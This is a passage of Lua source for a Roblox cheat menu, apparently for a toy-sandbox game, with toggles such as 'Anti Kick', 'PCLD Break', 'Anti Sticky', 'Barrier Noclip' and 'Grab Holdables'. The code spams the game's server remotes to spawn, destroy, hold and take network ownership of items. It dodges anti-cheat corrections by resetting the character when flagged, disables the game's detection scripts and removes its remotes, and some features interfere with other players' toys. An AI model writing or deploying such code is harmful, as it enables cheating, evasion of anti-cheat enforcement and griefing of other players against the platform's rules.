        InPlot:GetPropertyChangedSignal('Value'):Wait()
    end
    if CanSpawnToy and not CanSpawnToy.Value then
        CanSpawnToy:GetPropertyChangedSignal('Value'):Wait()
    end

    local hrp = plr.Character and plr.Character:FindFirstChild('HumanoidRootPart')

    if not hrp then
        return nil
    end

    local SpawnCF = (MyPCLD or hrp).CFrame * CFrame.new(0, 14, 20)
    local Container = (InOwnedPlot and InOwnedPlot.Value) and CheckForHome() or inv

    if not Container then
        return nil
    end

    local spawnedObject = nil
    local connection

    connection = Container.ChildAdded:Connect(function(child)
        if child.Name == ToyName then
            spawnedObject = child
        end
    end)

    task.spawn(function()
        pcall(function()
            local menuToys = RS:FindFirstChild('MenuToys')
            local spawnRemote = menuToys and menuToys:FindFirstChild('SpawnToyRemoteFunction')

            if spawnRemote then
                spawnRemote:InvokeServer(ToyName, SpawnCF, Vector3.zero)
            end
        end)
    end)

    local start = tick()

    repeat
        task.wait()
    until spawnedObject or (tick() - start) > 2.5

    if connection then
        connection:Disconnect()
    end

    return spawnedObject
end
function FindPCLD(hrp)
    if pcldConn then
        pcldConn:Disconnect()
    end

    MyPCLD = nil
    pcldConn = RunService.Heartbeat:Connect(function()
        if MyPCLD or not hrp or not hrp.Parent then
            if pcldConn then
                pcldConn:Disconnect()

                pcldConn = nil
            end

            return
        end

        for _, v in pairs(workspace:GetChildren())do
            if v.Name == 'PlayerCharacterLocationDetector' and v:IsA('BasePart') then
                if GetMagnitude(v, hrp) <= 2 then
                    MyPCLD = v

                    break
                end
            end
        end
    end)
end

DefUtilExtra:AddCheckbox('AntiKickItemFlag', {
    Text = 'Item Anti Kick',
    Tooltip = 'Uses the selected item as your anti kick',
    Default = false,
})
Toggles.AntiKickItemFlag:OnChanged(function(Val)
    if SetToggleState then
        SetToggleState('AntiKickItemFlag', Val)
    end

    AntiKickItemActive = Val

    if Val then
        task.spawn(function()
            local Item, SoundPart

            while AntiKickItemActive and task.wait() do
                local char = plr.Character
                local hrp = char and char:FindFirstChild('HumanoidRootPart')
                local hum = char and char:FindFirstChild('Humanoid')
                local inPlot = plr:FindFirstChild('InPlot')
                local inv = workspace:FindFirstChild(plr.Name .. 'SpawnedInToys')
                local destroyToy = RS:FindFirstChild('MenuToys') and RS.MenuToys:FindFirstChild('DestroyToy')

                if not hrp or not hum or hum.Health <= 0 or not inv then
                    continue
                end
                if inPlot and inPlot.Value then
                    continue
                end
                if not MyPCLD and not pcldConn then
                    FindPCLD(hrp)
                end

                Item = inv:FindFirstChild('AntiKickItem')
                SoundPart = Item and Item:FindFirstChild('Hitbox')

                if not Item or not SoundPart then
                    for _, v in pairs(inv:GetChildren())do
                        if v.Name == 'AntiKickItem' then
                            pcall(function()
                                destroyToy:FireServer(v)
                            end)
                        end
                    end

                    Item = SpawnToy(SelectedToy)

                    if not Item then
                        continue
                    end

                    SoundPart = Item and FWD(Item, 'Hitbox', 0.5)

                    if SoundPart then
                        sno(SoundPart)
                    end

                    for _, v in pairs(Item:GetChildren())do
                        if v:IsA('BasePart') then
                            v.CanCollide = false
                        end
                    end

                    local existingHighlight = Item:FindFirstChild('AntiKickHighlight')

                    if not existingHighlight then
                        local Highlight = Instance.new('Highlight')

                        Highlight.Name = 'AntiKickHighlight'
                        Highlight.Adornee = Item
                        Highlight.FillTransparency = 1
                        Highlight.OutlineTransparency = 0
                        Highlight.OutlineColor = Color3.fromRGB(0, 255, 255)
                        Highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        Highlight.Parent = Item
                    end

                    Item.Name = 'AntiKickItem'
                end
                if SoundPart and not CheckNetworkOwnerOnPart(SoundPart) then
                    sno(SoundPart)
                end

                local targetPart = MyPCLD or hrp:FindFirstChild('FirePlayerPart') or hrp

                if SoundPart and targetPart then
                    SoundPart.CFrame = targetPart.CFrame
                    SoundPart.AssemblyLinearVelocity = Vector3.zero
                    SoundPart.AssemblyAngularVelocity = Vector3.zero
                end
            end
        end)
    else
        if pcldConn then
            pcldConn:Disconnect()

            pcldConn = nil
        end

        MyPCLD = nil

        task.spawn(function()
            local inv = workspace:FindFirstChild(plr.Name .. 'SpawnedInToys')
            local destroyToy = RS:FindFirstChild('MenuToys') and RS.MenuToys:FindFirstChild('DestroyToy')

            if inv and destroyToy then
                for _, v in pairs(inv:GetChildren())do
                    if v.Name == 'AntiKickItem' then
                        pcall(function()
                            destroyToy:FireServer(v)
                        end)
                    end
                end
            end
        end)
    end
end)
plr.CharacterAdded:Connect(function(char)
    if AntiKickItemActive then
        MyPCLD = nil

        local hrp = char:WaitForChild('HumanoidRootPart', 5)

        if hrp then
            FindPCLD(hrp)
        end
    end
end)
DefUtilExtra:AddCheckbox('AntiKickEsp', {
    Text = 'ESP Anti Kicks',
    Tooltip = 'Views every sticky in a blue and black color.',
    Default = false,
    Callback = function(v)
        function applyHighlight(obj)
            if not obj or not obj:FindFirstChild('StickyPart') then
                return
            end

            local high = Instance.new('Highlight')

            high.Adornee = obj
            high.FillColor = Color3.fromRGB(0, 140, 255)
            high.OutlineColor = Color3.fromRGB(0, 0, 0)
            high.FillTransparency = 0.2
            high.OutlineTransparency = 0
            high.Parent = obj

            local weld = obj.StickyPart:FindFirstChild('StickyWeld')

            if weld then
                function update()
                    if weld.Part1 then
                        high.FillColor = Color3.fromRGB(0, 140, 255)
                    else
                        high.FillColor = Color3.fromRGB(0, 90, 170)
                    end
                end

                update()
                weld:GetPropertyChangedSignal('Part1'):Connect(update)
            end
        end

        if v then
            for _, pl in Players:GetPlayers()do
                if pl ~= plr then
                    local folder = workspace:FindFirstChild(pl.Name .. 'SpawnedInToys')

                    if folder then
                        for _, obj in ipairs(folder:GetChildren())do
                            applyHighlight(obj)
                        end

                        cons['antikickesp' .. pl.Name] = folder.ChildAdded:Connect(function(obj)
                            task.wait(0.4)
                            applyHighlight(obj)
                        end)
                    end
                end
            end
        else
            for _, pl in Players:GetPlayers()do
                if pl ~= plr then
                    local folder = workspace:FindFirstChild(pl.Name .. 'SpawnedInToys')

                    if cons['antikickesp' .. pl.Name] then
                        cons['antikickesp' .. pl.Name]:Disconnect()

                        cons['antikickesp' .. pl.Name] = nil
                    end
                    if folder then
                        for _, obj in ipairs(folder:GetChildren())do
                            local h = obj:FindFirstChildOfClass('Highlight')

                            if h then
                                h:Destroy()
                            end
                        end
                    end
                end
            end
        end
    end,
})
DefUtilExtra:AddCheckbox('AutoReset', {
    Text = 'Anti Kick',
    Tooltip = 'If flagged (Flying), instantly resets character.',
    Default = false,
    Callback = function(enabled)
        if enabled then
            cons.AutoReset = rs.GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(reason)
                if reason == 'Flying' then
                    Library:Notify('[Auto Reset] Correction detected: ' .. reason .. '. Resetting...', 4)
                    hum:ChangeState('Dead')
                end
            end)
        else
            if cons.AutoReset then
                cons.AutoReset:Disconnect()

                cons.AutoReset = nil
            end
        end
    end,
})
DefUtilExtra:AddCheckbox('ShurikenAutoEnable', {
    Text = 'Auto Enable Anti Kick',
    Tooltip = 'Auto enables Anti Kick if flagged by server.',
    Default = false,
    Callback = function(enabled)
        if enabled then
            autoEnConn = rs.GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(reason)
                if not _G.ShurikenAntiKick then
                    _G.ShurikenAntiKick = true

                    Library:Notify({
                        Title = '<b>UNSTABLE</b>',
                        Description = 'Anti-cheat flagged you (' .. tostring(reason) .. '). Auto-enabled.',
                        Persist = false,
                    })
                    pcall(function()
                        Toggle:Set(true)
                    end)
                    HookRespawn()
                    task.spawn(RunAntiKick)
                end
            end)
        else
            if autoEnConn then
                pcall(function()
                    autoEnConn:Disconnect()
                end)

                autoEnConn = nil
            end
            if not _G.ShurikenAntiKick then
                GlobalClearKunai()
            end
        end
    end,
})
DefUtilExtra:AddCheckbox('AntiKickToggle', {
    Text = 'Pencil Anti Kick',
    Tooltip = 'Normal anti kick but uses a pencil',
    Default = false,
    Callback = function(Value)
        AK = Value

        task.spawn(function()
            while AK do
                local inv = Workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')

                while inv and not inv:FindFirstChild('ToolPencil') and AK do
                    local char = LocalPlayer.Character
                    local hrp = char and char:FindFirstChild('HumanoidRootPart')

                    if hrp then
                        rs.MenuToys.SpawnToyRemoteFunction:InvokeServer('ToolPencil', hrp.CFrame + Vector3.new(0, 0, 15), Vector3.zero)
                    end

                    task.wait(0.05)
                end

                if not AK then
                    break
                end

                local char = LocalPlayer.Character
                local torso = char and char:FindFirstChild('Torso')
                local hrp = char and char:FindFirstChild('HumanoidRootPart')
                local pencil = inv and inv:FindFirstChild('ToolPencil')

                if torso and hrp and pencil then
                    local sticky = pencil:FindFirstChild('StickyPart')
                    local weld = sticky and sticky:FindFirstChild('StickyWeld')

                    if sticky and weld then
                        if weld.Part1 ~= torso then
                            local a = pencil.SoundPart.CFrame.Position
                            local b = hrp.CFrame.Position
                            local dist = math.sqrt((a.X - b.X) ^ 2 + (a.Y - b.Y) ^ 2 + (a.Z - b.Z) ^ 2)

                            if dist > 20 then
                                rs.MenuToys.DestroyToy:FireServer(pencil)
                            else
                                rs.PlayerEvents.StickyPartEvent:FireServer(sticky, torso, CFrame.new(0, -1, 0) * CFrame.Angles(0, math.pi, 0))

                                for _, prt in pairs(pencil:GetChildren())do
                                    if prt:IsA('BasePart') then
                                        prt.CanQuery = false
                                    end
                                end

                                task.wait(0.1)

                                if pencil.StickyPart.StickyWeld.Part1 ~= torso then
                                    rs.GrabEvents.SetNetworkOwner:FireServer(pencil.SoundPart, pencil.SoundPart.CFrame)
                                end
                            end
                        end
                    end
                end

                task.wait(0.02)
            end
        end)
    end,
})

local antiVoidTP = false
local Spawn = CFrame.new(0, -7.35, 0)

DefUtilExtra:AddCheckbox('AntiVoidTP', {
    Text = 'Anti Void TP',
    Tooltip = 'Teleports you to spawn if you fall.',
    Default = false,
}):OnChanged(function(v)
    antiVoidTP = v
end)
RunService.Heartbeat:Connect(function()
    if not antiVoidTP then
        return
    end

    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if hrp and hrp.Position.Y < -100 then
        hrp.CFrame = Spawn + Vector3.new(0, 5, 0)
    end
end)
DefUtilExtra:AddCheckbox('AntiVoid', {
    Text = 'Anti Void',
    Tooltip = 'Disables void kill height.',
    Default = false,
}):OnChanged(function(v)
    Workspace.FallenPartsDestroyHeight = v and (0 / 0) or -100
end)

AutoPCLDBreak = false
BusyBreaking = false

DefUtilExtra:AddCheckbox('AutoPCLDBreak', {
    Text = 'PCLD Break',
    Tooltip = 'Breaks your pcld automatically making you unable to be kicked ',
    Default = false,
})

function BreakPCLD()
    if BusyBreaking then
        return
    end

    BusyBreaking = true

    local Character = LocalPlayer.Character

    if not Character then
        BusyBreaking = false

        return
    end

    local Humanoid = Character:FindFirstChildWhichIsA('Humanoid')

    if not Humanoid then
        BusyBreaking = false

        return
    end

    Humanoid.Health = 0

    local NewCharacter = LocalPlayer.CharacterAdded:Wait()
    local NewHumanoid = NewCharacter:WaitForChild('Humanoid')

    task.wait(0.15)

    if NewHumanoid and NewHumanoid.Health > 0 then
        NewHumanoid.Health = 0
    end

    task.wait(0.35)

    BusyBreaking = false
end
function SetupCharacter(Character)
    local Humanoid = Character:WaitForChild('Humanoid')

    Humanoid.Died:Connect(function()
        if not AutoPCLDBreak or BusyBreaking then
            return
        end

        task.spawn(function()
            LocalPlayer.CharacterAdded:Wait()

            if not AutoPCLDBreak then
                return
            end

            task.wait(0.25)
            BreakPCLD()
        end)
    end)
end

Toggles.AutoPCLDBreak:OnChanged(function(state)
    AutoPCLDBreak = state

    if state then
        task.spawn(BreakPCLD)
    end
end)
LocalPlayer.CharacterAdded:Connect(SetupCharacter)

if LocalPlayer.Character then
    SetupCharacter(LocalPlayer.Character)
end

DefUtilExtra:AddCheckbox('AntiOwnershipKick', {
    Text = 'Anti Ownership Kick',
    Tooltip = 'Returns you if flung extremely far away.',
    Default = false,
    Callback = function(Value)
        antiok = Value

        task.spawn(function()
            while antiok do
                local ch = LocalPlayer.Character
                local hrp = ch and ch:FindFirstChild('HumanoidRootPart')

                if hrp and hrp.Position.Magnitude > 10000000 then
                    if SL ~= 'off' then
                        hrp.CFrame = CFrame.new(SL)
                    else
                        hrp.CFrame = CFrame.new(0, -10, 0)
                    end

                    hrp.AssemblyLinearVelocity = Vector3.zero
                end

                task.wait()
            end
        end)
    end,
})
DefUtilExtra:AddCheckbox('AntiSticky', {
    Text = 'Anti Sticky',
    Default = false,
    Tooltip = 'Prevents sticky attachments from attaching to u',
    Callback = function(v)
        local stickyScript = plr.PlayerScripts:FindFirstChild('StickyPartsTouchDetection')

        if not stickyScript then
            for _, child in ipairs(plr.PlayerScripts:GetDescendants())do
                if child:IsA('LocalScript') and (child.Name == 'StickyPartsTouchDetection' or child.Name:lower():find('sticky') or child.Name:lower():find('touchdetect')) then
                    stickyScript = child

                    break
                end
            end
        end
        if stickyScript and stickyScript:IsA('BaseScript') then
            stickyScript.Disabled = v
        end
        if v then
            task.spawn(function()
                while Toggles.AntiSticky and Toggles.AntiSticky.Value do
                    local char = plr.Character

                    if char then
                        local hrp = char:FindFirstChild('HumanoidRootPart')
                        local head = char:FindFirstChild('Head')

                        if hrp and head then
                            local rootPos = hrp.Position
                            local toysFolder = workspace:FindFirstChild(plr.Name .. 'SpawnedInToys')

                            if toysFolder then
                                for _, toy in ipairs(toysFolder:GetChildren())do
                                    if toy:IsA('Model') then
                                        local stickyPart = toy:FindFirstChild('StickyPart', true)

                                        if stickyPart and stickyPart:IsA('BasePart') then
                                            local dist = (stickyPart.Position - rootPos).Magnitude

                                            if dist < 20 then
                                                for _, constraint in ipairs(toy:GetDescendants())do
                                                    if (constraint:IsA('WeldConstraint') or constraint:IsA('Weld') or constraint:IsA('RigidConstraint')) and (constraint.Name:lower():find('sticky') or (constraint.Parent and constraint.Parent.Name:lower():find('sticky'))) then
                                                        local part0 = constraint:FindFirstChild('Part0') or (constraint:IsA('WeldConstraint') and constraint.Part0) or (constraint:IsA('Weld') and constraint.Part0)
                                                        local part1 = constraint:FindFirstChild('Part1') or (constraint:IsA('WeldConstraint') and constraint.Part1) or (constraint:IsA('Weld') and constraint.Part1)

                                                        if (part0 and part0:IsDescendantOf(char)) or (part1 and part1:IsDescendantOf(char)) then
                                                            constraint:Destroy()
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end

                            for _, player in ipairs(Players:GetPlayers())do
                                if player ~= plr then
                                    local otherToys = workspace:FindFirstChild(player.Name .. 'SpawnedInToys')

                                    if otherToys then
                                        for _, toy in ipairs(otherToys:GetChildren())do
                                            if toy:IsA('Model') then
                                                local stickyPart = toy:FindFirstChild('StickyPart', true)

                                                if stickyPart and stickyPart:IsA('BasePart') then
                                                    local dist = (stickyPart.Position - rootPos).Magnitude

                                                    if dist < 10 then
                                                        for _, constraint in ipairs(toy:GetDescendants())do
                                                            if (constraint:IsA('WeldConstraint') or constraint:IsA('Weld') or constraint:IsA('RigidConstraint')) then
                                                                local part0 = (constraint:IsA('WeldConstraint') and constraint.Part0) or (constraint:IsA('Weld') and constraint.Part0)
                                                                local part1 = (constraint:IsA('WeldConstraint') and constraint.Part1) or (constraint:IsA('Weld') and constraint.Part1)

                                                                if (part0 and part0:IsDescendantOf(char)) or (part1 and part1:IsDescendantOf(char)) then
                                                                    pcall(function()
                                                                        local SetNetOwner = replicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner')

                                                                        SetNetOwner:FireServer(stickyPart, hrp.CFrame)
                                                                    end)
                                                                    task.wait(0.1)
                                                                    constraint:Destroy()
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end

                            local overlapParams = OverlapParams.new()

                            overlapParams.FilterType = Enum.RaycastFilterType.Exclude
                            overlapParams.FilterDescendantsInstances = {char}

                            local nearbyParts = workspace:GetPartBoundsInRadius(rootPos, 15, overlapParams)

                            for _, part in ipairs(nearbyParts)do
                                if part:IsA('BasePart') then
                                    for _, child in ipairs(part:GetChildren())do
                                        if (child:IsA('WeldConstraint') or child:IsA('Weld')) and child.Name:lower():find('sticky') then
                                            local part0 = (child:IsA('WeldConstraint') and child.Part0) or (child:IsA('Weld') and child.Part0)
                                            local part1 = (child:IsA('WeldConstraint') and child.Part1) or (child:IsA('Weld') and child.Part1)

                                            if (part0 and part0:IsDescendantOf(char)) or (part1 and part1:IsDescendantOf(char)) then
                                                if part.Name:lower():find('sticky') or (part.Parent and part.Parent.Name:lower():find('sticky')) then
                                                    child:Destroy()
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end

                    task.wait(0.2)
                end
            end)
        end
    end,
})
DefUtilExtra:AddCheckbox('WaterWalkToggle', {
    Text = 'Water Walk',
    Tooltip = 'Enable collision on the ocean surface',
    Default = false,
}):OnChanged(function(v)
    local ocean = workspace:FindFirstChild('Map') and workspace.Map:FindFirstChild('AlwaysHereTweenedObjects') and workspace.Map.AlwaysHereTweenedObjects:FindFirstChild('Ocean') and workspace.Map.AlwaysHereTweenedObjects.Ocean:FindFirstChild('Object') and workspace.Map.AlwaysHereTweenedObjects.Ocean.Object:FindFirstChild('ObjectModel')

    if not ocean then
        return
    end

    for _, p in ipairs(ocean:GetChildren())do
        if p:IsA('BasePart') and p.Name == 'Ocean' then
            p.CanCollide = v
        end
    end
end)
DefUtilExtra:AddCheckbox('AntiLagToggle', {
    Text = 'Anti Lag',
    Default = false,
    Callback = function(Value)
        if Value then
            local grabFolder = ReplicatedStorage:FindFirstChild('GrabEvents')

            if grabFolder then
                local create = grabFolder:FindFirstChild('CreateGrabLine')
                local extend = grabFolder:FindFirstChild('ExtendGrabLine')

                if create and create:IsA('RemoteEvent') then
                    create:Destroy()
                end
                if extend and extend:IsA('RemoteEvent') then
                    extend:Destroy()
                end
            end

            for _, v in ipairs(workspace:GetDescendants())do
                if v:IsA('Beam') or v.Name:lower():find('line') then
                    v:Destroy()
                end
            end
        else
            local grabFolder = ReplicatedStorage:FindFirstChild('GrabEvents')

            if grabFolder then
                if createGrabLineCopy and not grabFolder:FindFirstChild('CreateGrabLine') then
                    local restoredCreate = createGrabLineCopy:Clone()

                    restoredCreate.Parent = grabFolder
                end
                if extendGrabLineCopy and not grabFolder:FindFirstChild('ExtendGrabLine') then
                    local restoredExtend = extendGrabLineCopy:Clone()

                    restoredExtend.Parent = grabFolder
                end
            end
        end
    end,
})
DefUtilExtra:AddCheckbox('AutoAntiLag', {
    Text = 'Auto Anti Lag',
    Tooltip = 'Turns on antilag when your fps is low',
    Default = false,
})

grabpersec = 0
antilagggauto = false
antilaggg = false
GrabEvents = ReplicatedStorage:FindFirstChild('GrabEvents')
DestroyGrabLineRemote = GrabEvents and GrabEvents:FindFirstChild('DestroyGrabLine')

Toggles.AutoAntiLag:OnChanged(function(state)
    antilagggauto = state

    print('Auto Anti Lag:', state)

    if state then
        task.spawn(function()
            while Toggles.AutoAntiLag.Value do
                task.wait(10)
                antiLagSpamCleanup()
            end
        end)
    end
end)
Workspace.DescendantAdded:Connect(function(descendant)
    if not antilagggauto then
        return
    end
    if descendant:IsA('Model') and descendant.Name == 'GrabParts' then
        grabpersec += 1
    end

    task.delay(1, function()
        if grabpersec > 0 then
            grabpersec -= 1
        end
    end)

    if grabpersec > 25 then
        grabpersec = 0

        local scriptRef = LocalPlayer.PlayerScripts:FindFirstChild('CharacterAndBeamMove')

        if scriptRef then
            scriptRef.Disabled = true

            print('Anti Lag Enabled')
            task.delay(60, function()
                if scriptRef and not antilaggg then
                    scriptRef.Disabled = false

                    print('Anti Lag Disabled')
                end
            end)
        end
    end
end)

function antiLagSpamCleanup()
    if not (antilaggg or antilagggauto) then
        return
    end

    for _, obj in ipairs(Workspace:GetDescendants())do
        if obj:IsA('Model') and obj.Name == 'GrabParts' then
            if DestroyGrabLineRemote then
                for i = 1, 5 do
                    pcall(function()
                        DestroyGrabLineRemote:FireServer(obj)
                    end)
                end
            end
        end
    end
end

local ToyList = {
    Coconut = 'FoodCoconut',
    Banana = 'FoodBanana',
    Fries = 'FoodFrenchFries',
    MeatStick = 'FoodMeatStick',
    Poop = 'PoopPile',
    Donut = 'FoodDonut',
    Cake = 'FoodCakePink',
    Burger = 'FoodHamburger',
    Pizza = 'FoodPizzaCheese',
    Hotdog = 'FoodHotdog',
    Mushroom = 'FoodMushroomPoison',
    Banjo = 'InstrumentGuitarBanjo',
    Violin = 'InstrumentGuitarViolin',
    Ukulele = 'InstrumentGuitarUkulele',
    Sax = 'InstrumentWoodwindSaxophone',
    Vuvuzela = 'InstrumentBrassVuvuzela',
    Bongos = 'InstrumentDrumBongos',
    Mic = 'InstrumentVoiceMicrophone',
    Pepperoni = 'FoodPizzaPepperoni',
    Piano = 'InstrumentPianoMelodica',
    Bread = 'FoodBread',
    Egg = 'FoodDippyEgg',
    Mayo = 'FoodMayonnaise',
    WhiteMug = 'CupMugWhite',
    Ocarina = 'InstrumentWoodwindOcarina',
    SparklePoop = 'PoopPileSparkle',
    BrownMug = 'CupMugBrown',
    Trumpet = 'InstrumentBrassTrumpet',
    Snare = 'InstrumentDrumSnare',
    Lyre = 'InstrumentGuitarLyre',
}
local DropdownValues = {}

for shortName, _ in pairs(ToyList)do
    table.insert(DropdownValues, shortName)
end

table.sort(DropdownValues)

local DefaultToy = 'Burger'
local SelectedToy = ToyList[DefaultToy] or ToyList[DropdownValues[1] ]

DefInput:AddDropdown('InputLagToyDropdown', {
    Values = DropdownValues,
    Default = DefaultToy,
    Multi = false,
    Text = 'Select Input Lag Toy',
})
Options.InputLagToyDropdown:OnChanged(function(Value)
    SelectedToy = ToyList[Value]
end)
DefInput:AddCheckbox('InstantInputLag', {
    Text = 'Anti Input Lag',
    Default = false,
})
Toggles.InstantInputLag:OnChanged(function(Value)
    if SetToggleState then
        SetToggleState('InstantInputLag', Value)
    end

    _G.InstantLagActive = Value

    if Value then
        task.spawn(function()
            local plr = game.Players.LocalPlayer
            local RS = game:GetService('ReplicatedStorage')
            local SpawnRemote = RS:WaitForChild('MenuToys'):WaitForChild('SpawnToyRemoteFunction')
            local HoldDuration = 0.02
            local CycleSpeed = 0.02

            while _G.InstantLagActive do
                local char = plr.Character
                local hrp = char and char:FindFirstChild('HumanoidRootPart')

                if hrp then
                    local toysFolder = workspace:FindFirstChild(plr.Name .. 'SpawnedInToys')
                    local name = SelectedToy
                    local item = toysFolder and toysFolder:FindFirstChild(name)

                    for _, obj in pairs(workspace:GetChildren())do
                        if obj.Name == 'Shuriken' and obj:IsA('Model') then
                            for _, part in pairs(obj:GetDescendants())do
                                if part:IsA('BasePart') then
                                    part.CanCollide = false
                                    part.Massless = true
                                end
                            end
                        end
                    end

                    if not item or not item.Parent then
                        task.spawn(function()
                            pcall(function()
                                SpawnRemote:InvokeServer(name, hrp.CFrame * CFrame.new(0, -12, 0), Vector3.zero)
                            end)
                        end)
                        task.wait(0.1)
                    else
                        local holdPart = item:FindFirstChild('HoldPart')

                        if holdPart then
                            for _, v in pairs(item:GetDescendants())do
                                if v:IsA('BasePart') then
                                    v.CanCollide = false
                                    v.Massless = true
                                end
                            end

                            task.spawn(function()
                                pcall(function()
                                    holdPart.HoldItemRemoteFunction:InvokeServer(item, char)
                                end)
                            end)
                            task.wait(HoldDuration)
                            task.spawn(function()
                                pcall(function()
                                    holdPart.DropItemRemoteFunction:InvokeServer(item, CFrame.new(0, 5000, 0), Vector3.zero)
                                end)
                            end)
                        end
                    end
                end

                task.wait(CycleSpeed)
            end
        end)
    end
end)
GMisc:AddButton({
    Text = 'Barrier Noclip',
    Tooltip = 'Toggles whether plot barriers block grabbed objects.',
    Func = function()
        local cur = SvcWS:GetAttribute('PlotBarrierGrabable') or false
        local tog = not cur

        SvcWS:SetAttribute('PlotBarrierGrabable', tog)

        local plots = SvcWS:FindFirstChild('Plots')

        if plots then
            for _, v in pairs(plots:GetDescendants())do
                if v.Name == 'PlotBarrier' then
                    v.CanQuery = not tog
                    v.CanCollide = not tog
                    v.CanTouch = not tog
                end
            end
        end

        Notify('Barrier', tog and 'Barriers passable' or 'Barriers restored', 3)
    end,
})

local DestroyAllButton

GMisc:AddCheckbox('ShowDestroyAllButton', {
    Text = 'Destroy All Toys Button',
    Default = true,
})

function CreateDestroyButton()
    if DestroyAllButton and DestroyAllButton.Parent then
        return
    end

    DestroyAllButton = Instance.new('TextButton')
    DestroyAllButton.Name = 'DestroyAllButton'
    DestroyAllButton.Size = UDim2.fromOffset(180, 42)
    DestroyAllButton.Position = UDim2.new(0.5, 0, 0, 70)
    DestroyAllButton.AnchorPoint = Vector2.new(0.5, 0)
    DestroyAllButton.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
    DestroyAllButton.BorderSizePixel = 0
    DestroyAllButton.AutoButtonColor = false
    DestroyAllButton.Font = Enum.Font.GothamBold
    DestroyAllButton.Text = 'Destroy All Toys'
    DestroyAllButton.TextColor3 = Color3.fromRGB(240, 240, 240)
    DestroyAllButton.TextSize = 14
    DestroyAllButton.Parent = targetParent

    local Corner = Instance.new('UICorner')

    Corner.CornerRadius = UDim.new(0, 12)
    Corner.Parent = DestroyAllButton

    local Stroke = Instance.new('UIStroke')

    Stroke.Color = Color3.fromRGB(65, 65, 75)
    Stroke.Thickness = 1.5
    Stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    Stroke.Parent = DestroyAllButton

    local Gradient = Instance.new('UIGradient')

    Gradient.Rotation = 90
    Gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 40)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 22, 26)),
    })
    Gradient.Parent = DestroyAllButton

    DestroyAllButton.MouseEnter:Connect(function()
        DestroyAllButton.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
        Stroke.Color = Color3.fromRGB(100, 100, 120)
    end)
    DestroyAllButton.MouseLeave:Connect(function()
        DestroyAllButton.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
        Stroke.Color = Color3.fromRGB(65, 65, 75)
    end)
    DestroyAllButton.MouseButton1Click:Connect(function()
        local toyFolder = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')

        if not toyFolder then
            return
        end

        for _, toy in ipairs(toyFolder:GetChildren())do
            if toy.Name ~= 'ToyNumber' and toy.Name ~= '\u{c644}\u{c804}\u{d55c} \u{c0ac}\u{b78c}' and not Players:GetPlayerFromCharacter(toy) then
                ReplicatedStorage.MenuToys.DestroyToy:FireServer(toy)
            end
        end
    end)
end
function RemoveDestroyButton()
    if DestroyAllButton then
        DestroyAllButton:Destroy()

        DestroyAllButton = nil
    end
end

CreateDestroyButton()
Toggles.ShowDestroyAllButton:OnChanged(function(state)
    if state then
        CreateDestroyButton()
    else
        RemoveDestroyButton()
    end
end)
GMisc:AddCheckbox('HoldItemToggle', {
    Text = 'Grab Holdables',
    Tooltip = 'Holds all holdable items every 0.01 s.',
    Default = false,
}):OnChanged(function(enabled2)
    if enabled2 then
        if not holdItemLoop then
            holdItemLoop = coroutine.create(function()
                while true do
                    for _, item in pairs(Workspace:GetDescendants())do
                        if item:IsA('Model') and item:FindFirstChild('HoldPart') then
                            local hf = item.HoldPart:FindFirstChild('HoldItemRemoteFunction')

                            if hf then
                                hf:InvokeServer(item, Workspace:WaitForChild(LocalPlayer.Name, 9e9))
                            end
                        end
                    end

                    task.wait(0.01)
                end
            end)

            coroutine.resume(holdItemLoop)
        end
    else
        if holdItemLoop then
            coroutine.close(holdItemLoop)

            holdItemLoop = nil
        end
    end
end)

targetItemsDict = {
    CupMugWhite = true,
    CupMugBrown = true,
    FoodBanana = true,
    FoodBread = true,
    FoodBroccoli = true,
    FoodCakePink = true,
    FoodCoconut = true,
    FoodDippyEgg = true,
    FoodDonut = true,
    FoodFrenchFries = true,
    FoodHamburger = true,
    FoodHotdog = true,
    FoodMayonnaise = true,
    FoodMeatStick = true,
    FoodMushroomPoison = true,
    FoodPizzaCheese = true,
    FoodPizzaPepperoni = true,
    FoodSodaCan = true,
    PoopPile = true,
    PoopPileSparkle = true,
    InstrumentBrassBugle = true,
    InstrumentBrassTrumpet = true,
    InstrumentDrumBongos = true,
    InstrumentDrumSnare = true,
    InstrumentGuitarAcoustic = true,
    InstrumentGuitarBanjo = true,
    InstrumentGuitarLyre = true,
    InstrumentGuitarUkulele = true,
    InstrumentGuitarViolin = true,
    InstrumentPianoKeyboard = true,
    InstrumentPianoMelodica = true,
    InstrumentVoiceMicrophone = true,
    InstrumentWoodwindOcarina = true,
    InstrumentWoodwindSaxophone = true,
    InstrumentBrassVuvuzela = true,
}
processedItems = {}

function GetMyPlotNumber()
    local plots = workspace:FindFirstChild('Plots')

    if not plots then
        return nil
    end

    for i = 1, 5 do
        local plot = plots:FindFirstChild('Plot' .. i)

        if plot then
            local plotSign = plot:FindFirstChild('PlotSign')

            if plotSign then
                local owners = plotSign:FindFirstChild('ThisPlotsOwners')

                if owners then
                    local ownerVal = owners:FindFirstChildOfClass('StringValue')

                    if ownerVal and ownerVal.Value == plr.Name then
                        return i
                    end
                end
            end
        end
    end

    return nil
end
function ProcessItem(item)
    if not item or not item.Parent then
        return
    end
    if processedItems[item] then
        return
    end

    local holdPart = item:FindFirstChild('HoldPart')

    if not holdPart then
        return
    end

    local holdRemote = holdPart:FindFirstChild('HoldItemRemoteFunction')
    local dropRemote = holdPart:FindFirstChild('DropItemRemoteFunction')

    if holdRemote and dropRemote then
        processedItems[item] = true

        task.spawn(function()
            local char = plr.Character

            if not char then
                processedItems[item] = nil

                return
            end

            local success = pcall(function()
                holdRemote:InvokeServer(item, char)
